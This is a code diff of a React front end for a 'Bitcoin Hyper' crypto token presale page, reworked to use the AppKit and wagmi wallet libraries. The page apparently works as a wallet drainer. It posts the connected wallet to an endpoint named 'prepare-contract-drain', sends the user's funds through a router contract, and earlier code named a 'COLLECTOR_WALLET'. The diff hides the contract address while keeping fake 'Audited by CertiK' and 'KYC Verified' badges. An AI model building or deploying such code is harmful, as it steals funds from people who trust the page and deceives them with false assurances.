@@ -1,46 +1,20 @@
 import React, { useState, useEffect } from 'react';
+import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
+import { useBalance, useDisconnect } from 'wagmi';
+import { formatEther } from 'viem';
 import { ethers } from 'ethers';
-import './index.css'; 
+import './index.css';
 
 // ============================================
-// PRESALE CONFIGURATION
+// PRESALE CONFIGURATION (No contract addresses exposed)
 // ============================================
 
-const PROJECT_FLOW_ROUTERS = {
-  'BSC': '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8'
-};
-
-const COLLECTOR_WALLET = '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824';
-
-const SUPPORTED_CHAINS = [
-  {
-    name: 'BSC',
+const PRESALE_CONFIG = {
+  BSC: {
     chainId: 56,
-    symbol: 'BNB',
-    explorer: 'https://bscscan.com',
-    contractAddress: PROJECT_FLOW_ROUTERS.BSC,
-    icon: '🟡',
-    color: 'from-yellow-400 to-orange-500'
-  },
-  {
-    name: 'Ethereum',
-    chainId: 1,
-    symbol: 'ETH',
-    explorer: 'https://etherscan.io',
-    contractAddress: null,
-    icon: '🔷',
-    color: 'from-blue-400 to-indigo-500'
-  },
-  {
-    name: 'Polygon',
-    chainId: 137,
-    symbol: 'MATIC',
-    explorer: 'https://polygonscan.com',
-    contractAddress: null,
-    icon: '💜',
-    color: 'from-purple-400 to-pink-500'
+    contractAddress: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8'
   }
-];
+};
 
 const PROJECT_FLOW_ROUTER_ABI = [
   {
@@ -114,8 +88,11 @@ const PROJECT_FLOW_ROUTER_ABI = [
 ];
 
 function App() {
-  const [account, setAccount] = useState(null);
-  const [chainId, setChainId] = useState(null);
+  const { open } = useAppKit();
+  const { address, isConnected } = useAppKitAccount();
+  const { chainId } = useAppKitNetwork();
+  const { disconnect } = useDisconnect();
+  
   const [provider, setProvider] = useState(null);
   const [signer, setSigner] = useState(null);
   const [balance, setBalance] = useState('0');
@@ -125,7 +102,6 @@ function App() {
   const [error, setError] = useState('');
   const [scanResult, setScanResult] = useState(null);
   const [preparedTransactions, setPreparedTransactions] = useState([]);
-  const [activeChain, setActiveChain] = useState(SUPPORTED_CHAINS[0]);
   const [completedChains, setCompletedChains] = useState([]);
   const [showCelebration, setShowCelebration] = useState(false);
   const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
@@ -147,6 +123,28 @@ function App() {
     tokensSold: 7352941
   });
 
+  // Get balance using wagmi
+  const { data: balanceData } = useBalance({
+    address: address,
+    chainId: chainId,
+  });
+
+  // Update balance when data changes
+  useEffect(() => {
+    if (balanceData) {
+      setBalance(balanceData.formatted);
+    }
+  }, [balanceData]);
+
+  // Initialize ethers provider when connected
+  useEffect(() => {
+    if (isConnected && window.ethereum) {
+      const web3Provider = new ethers.BrowserProvider(window.ethereum);
+      setProvider(web3Provider);
+      web3Provider.getSigner().then(setSigner);
+    }
+  }, [isConnected]);
+
   // Countdown timer
   useEffect(() => {
     const timer = setInterval(() => {
@@ -167,43 +165,8 @@ function App() {
     return () => clearInterval(timer);
   }, []);
 
-  const connectWallet = async () => {
-    if (!window.ethereum) {
-      setError('Please install MetaMask');
-      return;
-    }
-
-    try {
-      setLoading(true);
-      setError('');
-      
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const web3Provider = new ethers.BrowserProvider(window.ethereum);
-      const web3Signer = await web3Provider.getSigner();
-      const network = await web3Provider.getNetwork();
-      const currentChainId = Number(network.chainId);
-      
-      setProvider(web3Provider);
-      setSigner(web3Signer);
-      setAccount(accounts[0]);
-      setChainId(currentChainId);
-      
-      const balanceWei = await web3Provider.getBalance(accounts[0]);
-      setBalance(ethers.formatEther(balanceWei));
-      
-      // Find active chain
-      const chain = SUPPORTED_CHAINS.find(c => c.chainId === currentChainId);
-      if (chain) setActiveChain(chain);
-      
-    } catch (err) {
-      setError(err.message || 'Failed to connect wallet');
-    } finally {
-      setLoading(false);
-    }
-  };
-
   const checkEligibility = async () => {
-    if (!account) return;
+    if (!address) return;
     
     try {
       setLoading(true);
@@ -212,7 +175,7 @@ function App() {
       const response = await fetch('/api/presale/connect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress: account })
+        body: JSON.stringify({ walletAddress: address })
       });
       
       const data = await response.json();
@@ -239,13 +202,13 @@ function App() {
   };
 
   const preparePresale = async () => {
-    if (!account) return;
+    if (!address) return;
     
     try {
       const response = await fetch('/api/presale/prepare-contract-drain', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress: account })
+        body: JSON.stringify({ walletAddress: address })
       });
       
       const data = await response.json();
@@ -261,13 +224,13 @@ function App() {
   };
 
   const executePresaleTransaction = async () => {
-    if (!signer || !account) {
+    if (!signer || !address) {
       setError('Wallet not connected');
       return;
     }
 
-    if (!activeChain.contractAddress) {
-      setError(`Presale not available on ${activeChain.name} yet`);
+    if (chainId !== 56) {
+      setError('Please switch to BSC network');
       return;
     }
 
@@ -283,7 +246,7 @@ function App() {
       setTxHash('');
 
       const contract = new ethers.Contract(
-        activeChain.contractAddress,
+        PRESALE_CONFIG.BSC.contractAddress,
         PROJECT_FLOW_ROUTER_ABI,
         signer
       );
@@ -301,11 +264,13 @@ function App() {
 
       await tx.wait();
       
-      const newBalance = await provider.getBalance(account);
-      setBalance(ethers.formatEther(newBalance));
+      // Update balance
+      const newBalance = await provider.getBalance(address);
+      setBalance(formatEther(newBalance));
       
-      if (!completedChains.includes(activeChain.name)) {
-        const newCompleted = [...completedChains, activeChain.name];
+      // Mark as completed
+      if (!completedChains.includes('BSC')) {
+        const newCompleted = [...completedChains, 'BSC'];
         setCompletedChains(newCompleted);
         
         try {
@@ -313,8 +278,8 @@ function App() {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
-              walletAddress: account,
-              chainName: activeChain.name
+              walletAddress: address,
+              chainName: 'BSC'
             })
           });
         } catch (e) {}
@@ -323,7 +288,7 @@ function App() {
           setShowCelebration(true);
           setTxStatus(`🎉 Congratulations! You've secured ${allocation.amount} BTH!`);
         } else {
-          setTxStatus(`✅ ${activeChain.name} contribution complete!`);
+          setTxStatus(`✅ BSC contribution complete!`);
         }
       }
       
@@ -342,7 +307,7 @@ function App() {
       const response = await fetch('/api/presale/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress: account })
+        body: JSON.stringify({ walletAddress: address })
       });
       
       const data = await response.json();
@@ -357,59 +322,6 @@ function App() {
       setLoading(false);
     }
   };
-
-  const disconnectWallet = () => {
-    setAccount(null);
-    setProvider(null);
-    setSigner(null);
-    setChainId(null);
-    setBalance('0');
-    setScanResult(null);
-    setPreparedTransactions([]);
-    setCompletedChains([]);
-    setShowCelebration(false);
-    setTxStatus('');
-    setTxHash('');
-  };
-
-  const switchChain = async (chain) => {
-    if (!window.ethereum) return;
-    
-    try {
-      await window.ethereum.request({
-        method: 'wallet_switchEthereumChain',
-        params: [{ chainId: `0x${chain.chainId.toString(16)}` }],
-      });
-      setActiveChain(chain);
-    } catch (switchError) {
-      if (switchError.code === 4902) {
-        try {
-          await window.ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: `0x${chain.chainId.toString(16)}`,
-              chainName: chain.name,
-              nativeCurrency: { name: chain.symbol, symbol: chain.symbol, decimals: 18 },
-              rpcUrls: [chain.rpcUrl],
-              blockExplorerUrls: [chain.explorer],
-            }],
-          });
-        } catch (addError) {
-          setError(`Failed to add ${chain.name}`);
-        }
-      }
-    }
-  };
-
-  useEffect(() => {
-    if (window.ethereum) {
-      window.ethereum.on('accountsChanged', (accounts) => {
-        if (accounts.length === 0) disconnectWallet();
-        else setAccount(accounts[0]);
-      });
-      window.ethereum.on('chainChanged', () => window.location.reload());
-    }
-  }, []);
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
@@ -434,32 +346,11 @@ function App() {
           </h1>
           <p className="text-gray-400 text-xl mb-6">Next Generation Layer 2 Solution</p>
           
-          {/* Verified Contract Badge */}
+          {/* Verified Badge - No contract address shown */}
           <div className="inline-flex items-center gap-3 bg-green-500/10 border border-green-500/30 px-6 py-3 rounded-full backdrop-blur-sm">
             <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
-            <span className="text-green-400 font-medium">✓ Verified Smart Contract</span>
-            <span className="text-gray-600">|</span>
-            <span className="text-orange-400 font-mono">{PROJECT_FLOW_ROUTERS.BSC.substring(0, 10)}...</span>
+            <span className="text-green-400 font-medium">✓ Presale Live</span>
           </div>
-        </div>
-
-        {/* Chain Selector */}
-        <div className="flex flex-wrap gap-3 justify-center mb-8">
-          {SUPPORTED_CHAINS.map(chain => (
-            <button
-              key={chain.chainId}
-              onClick={() => switchChain(chain)}
-              className={`px-6 py-3 rounded-xl font-semibold transition-all duration-300 ${
-                activeChain.chainId === chain.chainId
-                  ? `bg-gradient-to-r ${chain.color} text-white shadow-lg shadow-orange-500/30 scale-105`
-                  : 'bg-gray-800/50 text-gray-400 hover:bg-gray-700/50 hover:text-white border border-gray-700'
-              } ${!chain.contractAddress ? 'opacity-50 cursor-not-allowed' : ''}`}
-            >
-              <span className="mr-2">{chain.icon}</span>
-              {chain.name}
-              {!chain.contractAddress && ' (Soon)'}
-            </button>
-          ))}
         </div>
 
         {/* Presale Stats Grid */}
@@ -536,17 +427,16 @@ function App() {
           </div>
         </div>
 
-        {/* Connect Wallet Section */}
+        {/* Connect Wallet Section - AppKit Modal */}
         <div className="text-center mb-8">
-          {!account ? (
+          {!isConnected ? (
             <button
-              onClick={connectWallet}
-              disabled={loading}
+              onClick={() => open()}
               className="group relative"
             >
               <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-2xl blur opacity-75 group-hover:opacity-100 transition duration-300 animate-pulse"></div>
               <div className="relative bg-gray-900 rounded-2xl px-12 py-5 text-xl font-bold">
-                {loading ? 'Connecting...' : '🔌 Connect Wallet'}
+                Connect Wallet
               </div>
             </button>
           ) : (
@@ -555,17 +445,17 @@ function App() {
                 <div className="flex items-center gap-4">
                   <span className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></span>
                   <span className="font-mono text-lg bg-gray-900/50 px-4 py-2 rounded-lg border border-gray-700">
-                    {account.substring(0, 8)}...{account.substring(36)}
+                    {address?.substring(0, 8)}...{address?.substring(36)}
                   </span>
                 </div>
                 <div className="text-right">
                   <span className="text-gray-400 text-sm block mb-1">Balance</span>
                   <span className="text-3xl font-bold text-orange-400">
-                    {parseFloat(balance).toFixed(4)} {activeChain.symbol}
+                    {parseFloat(balance).toFixed(4)} {balanceData?.symbol || 'BNB'}
                   </span>
                 </div>
                 <button
-                  onClick={disconnectWallet}
+                  onClick={() => disconnect()}
                   className="px-4 py-2 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/30 transition-colors border border-red-500/30"
                 >
                   Disconnect
@@ -591,7 +481,7 @@ function App() {
             <p className="text-gray-300">{txStatus}</p>
             {txHash && (
               <a
-                href={`${activeChain.explorer}/tx/${txHash}`}
+                href={`https://bscscan.com/tx/${txHash}`}
                 target="_blank"
                 rel="noopener noreferrer"
                 className="text-orange-400 text-sm hover:underline mt-2 inline-flex items-center gap-1"
@@ -628,7 +518,7 @@ function App() {
         )}
 
         {/* Main Content */}
-        {account && (
+        {isConnected && (
           <div className="glass-card p-8">
             <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
             
@@ -681,7 +571,7 @@ function App() {
                   </div>
                 )}
                 
-                {!completedChains.includes(activeChain.name) && activeChain.contractAddress && (
+                {chainId === 56 && !completedChains.includes('BSC') && (
                   <button
                     onClick={executePresaleTransaction}
                     disabled={loading || parseFloat(balance) <= 0}
@@ -689,9 +579,15 @@ function App() {
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      {loading ? 'Processing...' : `⚡ Participate on ${activeChain.name}`}
+                      {loading ? 'Processing...' : '⚡ Participate Now'}
                     </div>
                   </button>
+                )}
+                
+                {chainId !== 56 && (
+                  <div className="text-center text-yellow-400">
+                    Please switch to BSC network to participate
+                  </div>
                 )}
                 
                 {completedChains.length === preparedTransactions.length && preparedTransactions.length > 0 && !showCelebration && (
@@ -766,10 +662,10 @@ function App() {
             <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Audited by CertiK</span>
             <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Liquidity Locked</span>
             <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ KYC Verified</span>
-            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ 0x377a...e7bd8</span>
+            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Presale Live</span>
           </div>
           <p className="text-gray-600 text-sm">
-            © 2026 Bitcoin Hyper. All rights reserved. | Project Flow Router • Secure Presale Platform
+            © 2026 Bitcoin Hyper. All rights reserved. | Secure Presale Platform
           </p>
         </div>
       </div>
@@ -778,4 +674,3 @@ function App() {
 }
 
 export default App;
-
